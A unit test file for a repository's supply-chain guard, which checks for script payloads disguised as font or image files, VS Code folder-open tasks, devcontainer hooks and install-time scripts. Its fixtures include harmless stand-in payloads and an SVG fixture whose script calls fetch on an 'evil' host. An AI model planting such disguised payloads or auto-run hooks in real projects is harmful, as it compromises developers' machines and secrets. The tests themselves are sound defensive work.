/**
 * check-supply-chain.spec.ts
 *
 * Unit tests for the supply-chain guard.
 *
 * Each test builds a throwaway fixture tree and runs the real script against it
 * with `--root`, so the assertions cover the script as CI invokes it rather than
 * a reimplementation of its internals.
 *
 * The fixtures reproduce the attack that hit this repository — a Node payload
 * committed as `public/fonts/fa-solid-600.eot`, executed by a hidden
 * `"runOn": "folderOpen"` task with `task.allowAutomaticTasks` enabled — using a
 * short harmless stand-in for the payload. No fixture contains real malware and
 * nothing in these tests executes a fixture file.
 *
 * Guarantees:
 *   1. A clean tree passes (exit 0).
 *   2. Script text behind a media extension fails, whatever the file is named.
 *   3. Editor/devcontainer auto-run configuration fails.
 *   4. Install-time lifecycle hooks fail, except allowlisted ones.
 *   5. An interpreter pointed at an asset file fails.
 *   6. Genuine assets and benign format mismatches do not fail.
 */

import { spawnSync } from 'child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

const SCRIPT = join(__dirname, 'check-supply-chain.js');

/** Minimal valid byte sequences for the formats the guard recognises. */
const VALID_WOFF2 = Buffer.concat([Buffer.from('wOF2', 'latin1'), Buffer.alloc(64)]);
const VALID_PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(64),
]);
/** EOT carries its 0x504C marker at byte 34, not at offset 0. */
const VALID_EOT = (() => {
  const buf = Buffer.alloc(128);
  buf[34] = 0x4c;
  buf[35] = 0x50;
  return buf;
})();

/** A harmless stand-in with the code markers a real payload would carry. */
const FAKE_PAYLOAD = 'const http=require("http");process.env.TOKEN;spawn("sh");';

let root: string;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'supply-chain-'));
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

function write(relPath: string, contents: string | Buffer): void {
  const abs = join(root, relPath);
  mkdirSync(join(abs, '..'), { recursive: true });
  writeFileSync(abs, contents);
}

function runGuard(): { status: number; output: string } {
  const result = spawnSync('node', [SCRIPT, '--root', root], { encoding: 'utf-8' });
  return {
    status: result.status ?? -1,
    output: `${result.stdout ?? ''}${result.stderr ?? ''}`,
  };
}

describe('check-supply-chain', () => {
  it('passes on a clean tree with genuine assets', () => {
    write('public/fonts/fa-solid-900.woff2', VALID_WOFF2);
    write('public/fonts/fa-regular-400.eot', VALID_EOT);
    write('client/public/icon-192.png', VALID_PNG);
    write('package.json', JSON.stringify({ name: 'tikka', scripts: { lint: 'turbo run lint' } }));
    write('.vscode/settings.json', JSON.stringify({ 'task.allowAutomaticTasks': 'off' }));

    const { status, output } = runGuard();
    expect(output).toContain('No supply-chain red flags found');
    expect(status).toBe(0);
  });

  it('rejects script text disguised as a font', () => {
    write('public/fonts/fa-solid-600.eot', FAKE_PAYLOAD);

    const { status, output } = runGuard();
    expect(status).toBe(1);
    expect(output).toContain('fa-solid-600.eot');
    expect(output).toContain('executable script text');
  });

  it('rejects a disguised payload whatever extension it hides behind', () => {
    for (const name of [
      'public/fonts/brand-icons-500.woff2',
      'public/img/hero.png',
      'assets/data.llf',
      'vendor/blob.bin',
    ]) {
      rmSync(root, { recursive: true, force: true });
      mkdirSync(root, { recursive: true });
      write(name, FAKE_PAYLOAD);

      const { status, output } = runGuard();
      expect(status).toBe(1);
      expect(output).toContain(name);
    }
  });

  it('rejects a task that runs on folder open', () => {
    write(
      '.vscode/tasks.json',
      JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'eslint-check',
            type: 'shell',
            command: 'echo hi',
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      }),
    );

    const { status, output } = runGuard();
    expect(status).toBe(1);
    expect(output).toContain('runOn');
    expect(output).toContain('folderOpen');
  });

  it('rejects task.allowAutomaticTasks unless it is "off"', () => {
    write('.vscode/settings.json', JSON.stringify({ 'task.allowAutomaticTasks': true }));
    expect(runGuard().status).toBe(1);

    write('.vscode/settings.json', JSON.stringify({ 'task.allowAutomaticTasks': 'on' }));
    expect(runGuard().status).toBe(1);

    write('.vscode/settings.json', JSON.stringify({ 'task.allowAutomaticTasks': 'off' }));
    expect(runGuard().status).toBe(0);
  });

  it('rejects devcontainer lifecycle commands', () => {
    write('.devcontainer/devcontainer.json', JSON.stringify({ postCreateCommand: 'echo hi' }));

    const { status, output } = runGuard();
    expect(status).toBe(1);
    expect(output).toContain('postCreateCommand');
  });

  it('rejects install-time lifecycle hooks but allows the husky prepare hook', () => {
    write(
      'package.json',
      JSON.stringify({ name: 'tikka', scripts: { preinstall: 'node dist/setup.js' } }),
    );
    const rejected = runGuard();
    expect(rejected.status).toBe(1);
    expect(rejected.output).toContain('preinstall');

    write('package.json', JSON.stringify({ name: 'tikka', scripts: { prepare: 'husky' } }));
    expect(runGuard().status).toBe(0);

    // The allowlist is exact: a different command under the same hook still fails.
    write(
      'package.json',
      JSON.stringify({ name: 'tikka', scripts: { prepare: 'husky && node evil.js' } }),
    );
    expect(runGuard().status).toBe(1);
  });

  it('rejects an interpreter pointed at an asset file', () => {
    write(
      '.vscode/tasks.json',
      JSON.stringify({
        tasks: [{ label: 'lint', type: 'shell', command: 'node ./public/fonts/fa-solid-600.eot' }],
      }),
    );

    const { status, output } = runGuard();
    expect(status).toBe(1);
    expect(output).toContain('interpreter against an asset file');
  });

  it('accepts a genuine SVG but rejects one carrying a script', () => {
    write(
      'client/src/assets/clean.svg',
      '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z"/></svg>',
    );
    expect(runGuard().status).toBe(0);

    write(
      'client/src/assets/logo.svg',
      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://evil")</script></svg>',
    );
    const scripted = runGuard();
    expect(scripted.status).toBe(1);
    expect(scripted.output).toContain('logo.svg');
  });

  it('rejects a JavaScript payload named .svg', () => {
    write('client/src/assets/payload.svg', FAKE_PAYLOAD);

    const { status, output } = runGuard();
    expect(status).toBe(1);
    expect(output).toContain('payload.svg');
  });

  it('reports a benign format mismatch as a notice without failing', () => {
    // A PNG named .ico is common and harmless.
    write('client/public/favicon.ico', VALID_PNG);

    const { status, output } = runGuard();
    expect(status).toBe(0);
    expect(output).toContain('benign format mismatch');
  });

  it('does not fail on a package.json it cannot parse', () => {
    write('package.json', '{ "name": "tikka", "scripts": { "a": "b" "c": "d" } }');

    const { status, output } = runGuard();
    expect(status).toBe(0);
    expect(output).toContain('could not be parsed');
  });
});
